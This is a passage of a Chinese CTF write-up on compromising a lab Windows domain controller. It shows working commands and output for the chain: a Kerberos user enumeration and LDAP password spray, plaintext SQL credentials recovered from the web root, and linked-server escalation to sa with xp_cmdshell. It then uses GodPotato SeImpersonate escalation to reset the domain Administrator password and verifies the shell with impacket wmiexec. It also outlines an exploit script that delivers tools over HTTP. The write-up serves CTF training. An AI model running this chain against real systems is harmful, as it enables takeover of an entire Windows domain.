C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c net user Administrator Xmctf2026Aa /domain"
```

`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GodPotato</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 的关键回显如下：</font>

```latex
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] Start Search System Token
[*] PID : 804 Token:0x800  User: NT AUTHORITY\SYSTEM
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid ...
The command completed successfully.
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这说明链条已经把 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sqlsvc</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 抬到了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">SYSTEM</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">，并成功执行了我们给它的命令。</font>

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">随后再查：</font>

```latex
net user Administrator /domain
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">可以看到 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Password last set</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 已经更新，说明域管理员密码确实被改掉了。</font>

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第六步：验证 Administrator shell</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">最后直接用新密码通过 impacket 的 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">wmiexec.py</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 验证远程管理员执行：</font>

```bash
python wmiexec.py XMCVE/Administrator:Xmctf2026Aa@169.254.212.20 whoami
python wmiexec.py XMCVE/Administrator:Xmctf2026Aa@169.254.212.20 hostname
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">回显：</font>

```latex
xmcve\administrator
CASTLEVANIA
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这一步已经满足题目要求的：</font>

```latex
拿到 Administrator shell
```

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">补充：本地 flag 文本的恢复</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">虽然官方 flag 要人工审核后发放，但镜像里其实残留了一个已经删除的本地 flag 文件线索。</font>

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">在 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Alucard</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 的 Recent 里有一个快捷方式：</font>

```latex
C:\Users\Alucard\Recent\flag.lnk
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">它指向：</font>

```latex
C:\Users\Administrator\Desktop\flag.txt
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这个文件本身已经被删掉了，但在回收站目录中仍然留有内容文件：</font>

```latex
$Recycle.Bin\S-1-5-21-...-500\$RIZ9PVX.txt
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">离线读这个文件，能恢复出：</font>

```latex
FLAG{XMCVE_Castlevania_Bloodlines_DA_Pwned}
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">再次强调，这更像是镜像内的本地证明文本，不一定等于比赛平台最后发放的正式 flag。</font>

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Exploit</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">完整利用脚本放在：</font>

```latex
exploit/solve.py
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">脚本做的事情是：</font>

1. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">在宿主机开启临时 HTTP 服务。</font>
2. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">用 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">wuwupor / lovlyBaby</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 登录 MSSQL。</font>
3. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">通过 linked server </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">POO_PUBLIC</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 执行 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">xp_cmdshell</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>
4. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">向客机投递并运行 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GodPotato-NET4.exe</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>
5. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">把 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Administrator</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 的域密码改成已知值。</font>
6. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">调用 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">wmiexec.py</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 验证 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Administrator</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> shell。</font>

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">运行方式</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">在当前主机上直接执行：</font>

```bash
python C:\AI知识库\Test\polarisctf2026\tasks\Web\16-BabyDC\exploit\solve.py
```

## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">小结</font>
<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这题的核心链非常清晰：</font>

```latex
离线盘分析 -> webroot 明文连接串 -> MSSQL 登录 ->
linked server 映射到 sa -> xp_cmdshell ->
GodPotato(SeImpersonate) -> SYSTEM ->
重置 Administrator 密码 -> Administrator shell
```

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">其中最关键的两个点是：</font>

1. `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">poo_connection.txt</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 泄露了 SQL 凭据。</font>
2. `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">POO_PUBLIC</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 这个 linked server 把普通 SQL 登录桥接成了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sa</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>

<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">有了这两步，后面的 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GodPotato</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 只是把 “系统命令执行” 再抬成 “管理员控制整台 DC”。</font>

# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GDEX(土豆提权)</font>
## <font style="color:rgb(51, 51, 51);">1. 题目环境与边界</font>
<font style="color:rgb(51, 51, 51);">工具：VirtualBox 7.2.0、PowerShell、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ipconfig</font>`

<font style="color:rgb(51, 51, 51);">目的：确认靶机网络、攻击边界和目标身份，确保后续动作只落在靶机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.101</font>`<font style="color:rgb(51, 51, 51);"> 上，不对宿主机做攻击。</font>

<font style="color:rgb(51, 51, 51);">关键命令：</font>

ipconfig

<font style="color:rgb(51, 51, 51);">关键结果：</font>

+ <font style="color:rgb(51, 51, 51);">宿主机 VirtualBox Host-Only 网卡为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.1/24</font>`<font style="color:rgb(51, 51, 51);">。</font>
+ <font style="color:rgb(51, 51, 51);">靶机最终恢复到 Host-Only 网络，目标地址确定为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.101</font>`<font style="color:rgb(51, 51, 51);">。</font>
+ <font style="color:rgb(51, 51, 51);">靶机身份后续通过 LDAP/SQL 进一步确认：</font>
    - <font style="color:rgb(51, 51, 51);">主机名：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA</font>`
    - <font style="color:rgb(51, 51, 51);">域名：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE.local</font>`
    - <font style="color:rgb(51, 51, 51);">系统：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Windows Server 2019</font>`
    - <font style="color:rgb(51, 51, 51);">角色：域控</font>

<font style="color:rgb(51, 51, 51);">说明：</font>

+ <font style="color:rgb(51, 51, 51);">整个过程只打 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.101</font>`<font style="color:rgb(51, 51, 51);">。</font>
+ <font style="color:rgb(51, 51, 51);">宿主机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.1</font>`<font style="color:rgb(51, 51, 51);"> 仅在后期作为 HTTP 文件服务端，给靶机下发工具文件，不作为攻击目标。</font>

## <font style="color:rgb(51, 51, 51);">2. 初始信息搜集</font>
### <font style="color:rgb(51, 51, 51);">2.1 Web 探测</font>
<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">web_probe.py</font>`

<font style="color:rgb(51, 51, 51);">目的：确认 Web 面是否存在可直接利用的入口、虚拟主机、隐藏路径或调试页面。</font>

<font style="color:rgb(51, 51, 51);">关键命令：</font>

```plain
import argparse
from typing import Iterable

import requests


DEFAULT_HOSTS = [
    "192.168.56.101",
    "castlevania",
    "castlevania.xmcve.local",
    "xmcve.local",
    "portal.xmcve.local",
    "intranet.xmcve.local",
    "employee.xmcve.local",
    "support.xmcve.local",
    "sql.xmcve.local",
    "dev.xmcve.local",
    "test.xmcve.local",
]

DEFAULT_PATHS = [
    "/",
    "/index.html",
    "/portal/",
    "/employee/",
    "/support/",
    "/login/",
    "/admin/",
    "/db/",
    "/sql/",
    "/backup/",
]


def probe(base_url: str, hostnames: Iterable[str], paths: Iterable[str], timeout: int) -> None:
    session = requests.Session()
    session.trust_env = False
    for host in hostnames:
        for path in paths:
            url = f"{base_url.rstrip('/')}{path}"
            try:
                response = session.get(
                    url,
                    headers={"Host": host},
                    timeout=timeout,
                    allow_redirects=False,
                    proxies={"http": None, "https": None},
                )
                server = response.headers.get("Server", "")
                print(
                    f"{response.status_code}\t{len(response.text)}\tHost={host}\tPath={path}\tServer={server}"
                )
            except Exception as exc:
                print(f"ERR\tHost={host}\tPath={path}\t{exc}")


def main() -> None:
    parser = argparse.ArgumentParser(description="HTTP vhost and path probing against a single target")
    parser.add_argument("--url", default="http://192.168.56.101", help="Base URL")
    parser.add_argument("--timeout", type=int, default=4, help="Request timeout")
    parser.add_argument("--hosts", nargs="*", default=DEFAULT_HOSTS, help="Host header candidates")
    parser.add_argument("--paths", nargs="*", default=DEFAULT_PATHS, help="Paths to probe")
    args = parser.parse_args()
    probe(args.url, args.hosts, args.paths, args.timeout)


if __name__ == "__main__":
    main()
```

python .\web_probe.py --url http://192.168.56.101

<font style="color:rgb(51, 51, 51);">关键结果：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">80/tcp</font>`<font style="color:rgb(51, 51, 51);"> 为 IIS 10.0。</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/</font>`<font style="color:rgb(51, 51, 51);"> 与 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/index.html</font>`<font style="color:rgb(51, 51, 51);"> 返回静态页面，内容为：</font>
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA Portal</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Employee Portal</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Under maintenance...</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">OPTIONS</font>`<font style="color:rgb(51, 51, 51);"> 允许的方法为：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">OPTIONS, TRACE, GET, HEAD, POST</font>`

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">Web 面非常薄，没有直接给出认证入口或现成 RCE。</font>
+ <font style="color:rgb(51, 51, 51);">站点更像“占位页面 + 后端另有依赖”，应继续往 IIS 配置、连接串和数据库方向挖。</font>

### <font style="color:rgb(51, 51, 51);">2.2 LDAP RootDSE 匿名枚举</font>
<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ldap_rootdse.py</font>`

<font style="color:rgb(51, 51, 51);">目的：确认域信息、LDAP 命名上下文、DC 身份。</font>

<font style="color:rgb(51, 51, 51);">关键命令：</font>

```plain
$env:PYTHONPATH='f:\aaa\新建文件夹\aaaaaaaaaasentou\.deps'
python .\ldap_rootdse.py
```

<font style="color:rgb(51, 51, 51);">关键结果：</font>

```plain
[+] default_naming_context: ['DC=XMCVE,DC=local']
[+] dns_host_name: ['CASTLEVANIA.XMCVE.local']
[+] ldap_service_name: ['XMCVE.local:castlevania$@XMCVE.LOCAL']
```

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">目标是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE.local</font>`<font style="color:rgb(51, 51, 51);"> 域内 DC。</font>
+ <font style="color:rgb(51, 51, 51);">后续所有 LDAP/Kerberos/MSSQL 利用都可以围绕这个域来展开。</font>

### <font style="color:rgb(51, 51, 51);">2.3 Kerberos 用户枚举</font>
<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">kerb_user_enum.py</font>`

<font style="color:rgb(51, 51, 51);">目的：枚举有效域用户，确认后续喷洒、凭据猜解和服务账号方向。</font>

<font style="color:rgb(51, 51, 51);">关键命令：</font>

```plain
$env:PYTHONPATH='f:\aaa\新建文件夹\aaaaaaaaaasentou\.deps'
python .\kerb_user_enum.py --no-asrep
```

<font style="color:rgb(51, 51, 51);">关键结果：</font>

```plain
VALID   Administrator   25
VALID   Alucard         25
VALID   support         25
VALID   sqlsvc          25
INVALID Guest           18
INVALID krbtgt          18
```

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">有效用户至少包括：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Alucard</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">support</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);">。</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 极像 MSSQL 服务账号，优先级最高。</font>

### <font style="color:rgb(51, 51, 51);">2.4 低噪声 LDAP 密码喷洒</font>
<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">password_spray_ldap.py</font>`

<font style="color:rgb(51, 51, 51);">目的：对已经确定的少量有效用户做极小范围喷洒，看看是否存在弱口令复用。</font>

<font style="color:rgb(51, 51, 51);">关键命令：</font>

```plain
$env:PYTHONPATH='f:\aaa\新建文件夹\aaaaaaaaaasentou\.deps'
python .\password_spray_ldap.py
```

<font style="color:rgb(51, 51, 51);">关键结果：</font>

+ <font style="color:rgb(51, 51, 51);">对 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Alucard / sqlsvc / support / Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的小范围喷洒没有命中。</font>

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">该题不走“简单弱口令”路线。</font>
+ <font style="color:rgb(51, 51, 51);">后续更应该关注配置泄露、服务账号、数据库与离线取证。</font>

### <font style="color:rgb(51, 51, 51);">2.5 初始开放端口结论</font>
<font style="color:rgb(51, 51, 51);">工具：端口探测</font>

<font style="color:rgb(51, 51, 51);">目的：建立完整攻击面。</font>

<font style="color:rgb(51, 51, 51);">关键结果：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">53/tcp</font>`<font style="color:rgb(51, 51, 51);"> DNS</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">80/tcp</font>`<font style="color:rgb(51, 51, 51);"> IIS 10.0</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">88/tcp</font>`<font style="color:rgb(51, 51, 51);"> Kerberos</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">135/tcp</font>`<font style="color:rgb(51, 51, 51);"> RPC</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">139/tcp</font>`<font style="color:rgb(51, 51, 51);"> NetBIOS</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">389/tcp</font>`<font style="color:rgb(51, 51, 51);"> LDAP</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">445/tcp</font>`<font style="color:rgb(51, 51, 51);"> SMB</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">464/tcp</font>`<font style="color:rgb(51, 51, 51);"> Kerberos kpasswd</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">593/tcp</font>`<font style="color:rgb(51, 51, 51);"> RPC over HTTP</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">636/tcp</font>`<font style="color:rgb(51, 51, 51);"> LDAPS</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1433/tcp</font>`<font style="color:rgb(51, 51, 51);"> MSSQL</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">9389/tcp</font>`<font style="color:rgb(51, 51, 51);"> AD Web Services</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">49666/tcp</font>``<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">49667/tcp</font>``<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">49669/tcp</font>``<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">49670/tcp</font>`<font style="color:rgb(51, 51, 51);"> 高位 RPC</font>

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">这是一台“域控 + IIS + MSSQL”混合角色机器。</font>
+ <font style="color:rgb(51, 51, 51);">真正可打的重心是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1433/tcp</font>`<font style="color:rgb(51, 51, 51);">，而不是薄弱的静态 Web 页面。</font>

## <font style="color:rgb(51, 51, 51);">3. 离线取证与关键线索</font>
<font style="color:rgb(51, 51, 51);">工具：VirtualBox 磁盘克隆、Python + </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">dissect.target</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">LnkParse3</font>`

<font style="color:rgb(51, 51, 51);">目的：Web 正面几乎没有入口时，直接离线分析系统盘，找明文凭据、服务配置、Recent 痕迹和管理员操作记录。</font>

<font style="color:rgb(51, 51, 51);">关键思路：</font>

1. <font style="color:rgb(51, 51, 51);">先对靶机系统盘做克隆，得到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">bloodstained_clone.vhd</font>`<font style="color:rgb(51, 51, 51);">。</font>
2. <font style="color:rgb(51, 51, 51);">用 Python + </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">dissect.target</font>`<font style="color:rgb(51, 51, 51);"> 打开克隆盘，重点查看：</font>
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\inetpub\wwwroot</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\Program Files\Microsoft SQL Server\...\ERRORLOG</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\Scripts</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ConsoleHost_history.txt</font>`
3. <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">LnkParse3</font>`<font style="color:rgb(51, 51, 51);"> 解析 Recent 目录下的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">.lnk</font>`<font style="color:rgb(51, 51, 51);">，恢复已删除文件曾经存在的路径。</font>

<font style="color:rgb(51, 51, 51);">关键发现 1：Web 根目录连接串泄露</font>

+ <font style="color:rgb(51, 51, 51);">文件：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\inetpub\wwwroot\poo_connection.txt</font>`
+ <font style="color:rgb(51, 51, 51);">内容关键信息：</font>

```plain
server=localhost;
user=wuwupor;
password=lovlyBaby
database=master
```

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">直接拿到 MSSQL 明文凭据 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor / lovlyBaby</font>`<font style="color:rgb(51, 51, 51);">。</font>
+ <font style="color:rgb(51, 51, 51);">这是整条链路的真正起点。</font>

<font style="color:rgb(51, 51, 51);">关键发现 2：SQL 服务账号</font>

+ <font style="color:rgb(51, 51, 51);">从 SQL ERRORLOG 可确认 SQL Server 服务账号为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\sqlsvc</font>`<font style="color:rgb(51, 51, 51);">。</font>

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">说明之后 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 很可能会以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 身份执行系统命令。</font>

<font style="color:rgb(51, 51, 51);">关键发现 3：linked server</font>

+ <font style="color:rgb(51, 51, 51);">SQL 内存在两个 linked server：</font>
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_CONFIG</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">这类配置在 CTF 里通常不是装饰，很可能就是从低权限 SQL 登录横向到高权限上下文的关键。</font>

<font style="color:rgb(51, 51, 51);">关键发现 4：辅助痕迹</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">MailBot.ps1</font>`<font style="color:rgb(51, 51, 51);"> 里出现过一组像比赛用户名/密码的字符串：</font>
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">pr3d1ct / yuyan_crypto</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">p2zhh / p2zhh_web</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">aomr / aomr_reverse</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">berial / berial_pwn</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Recent</font>`<font style="color:rgb(51, 51, 51);"> 和 PowerShell history 指向过一批已删除文件：</font>
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">dcsync.sh</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">golden_ticket.sh</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM.save</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SECURITY.save</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM.save</font>`
    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">fix_linked_server.ps1</font>`

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">这些痕迹说明题目设计方向就是“SQL/AD abuse -> 高权限控制”。</font>
+ <font style="color:rgb(51, 51, 51);">但它们只是辅助线索，不是最终利用点。</font>

## <font style="color:rgb(51, 51, 51);">4. MSSQL 利用链</font>
<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_sql_query.ps1</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_xpcmd.ps1</font>`

<font style="color:rgb(51, 51, 51);">目的：用已知 SQL 凭据登录数据库，判断权限边界，利用 linked server 完成 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`<font style="color:rgb(51, 51, 51);"> 提权，并开启 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);">。</font>

### <font style="color:rgb(51, 51, 51);">4.1 连接 MSSQL 并确认初始权限</font>
<font style="color:rgb(51, 51, 51);">关键命令：</font>

& .\invoke_sql_query.ps1 -Query "select @@servername as server_name, SYSTEM_USER as login_name, USER_NAME() as db_user, IS_SRVROLEMEMBER('sysadmin') as is_sysadmin"

<font style="color:rgb(51, 51, 51);">关键结果：</font>

+ <font style="color:rgb(51, 51, 51);">当前 SQL 登录为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor</font>`
+ <font style="color:rgb(51, 51, 51);">当前数据库用户最初只是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">guest</font>`
+ <font style="color:rgb(51, 51, 51);">初始并不是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`

<font style="color:rgb(51, 51, 51);">说明：</font>

+ <font style="color:rgb(51, 51, 51);">这意味着明文连接串本身还不够，需要继续从 SQL 配置里提权。</font>

### <font style="color:rgb(51, 51, 51);">4.2 枚举 linked server</font>
<font style="color:rgb(51, 51, 51);">关键命令：</font>

& .\invoke_sql_query.ps1 -Query "select server_id, name, data_source, is_linked, is_rpc_out_enabled, is_data_access_enabled from sys.servers order by server_id"

<font style="color:rgb(51, 51, 51);">关键结果：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_CONFIG -> localhost</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC -> localhost</font>`
+ <font style="color:rgb(51, 51, 51);">两者都开启了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">RPC OUT</font>`<font style="color:rgb(51, 51, 51);">，并允许数据访问</font>

<font style="color:rgb(51, 51, 51);">结论：</font>

+ <font style="color:rgb(51, 51, 51);">这两个 linked server 可以直接作为横向执行入口测试。</font>

### <font style="color:rgb(51, 51, 51);">4.3 验证 linked server 执行身份</font>
<font style="color:rgb(51, 51, 51);">关键命令：</font>

& .\invoke_sql_query.ps1 -Query "EXEC ('select @@servername as server_name, SYSTEM_USER as login_name, USER_NAME() as db_user') AT [POO_PUBLIC]" -ConnectionTimeout 20

<font style="color:rgb(51, 51, 51);">关键结果：</font>

```plain
server_name  login_name  db_user
CASTLEVANIA  sa          dbo
```

<font style="color:rgb(51, 51, 51);">补充观察：</font>

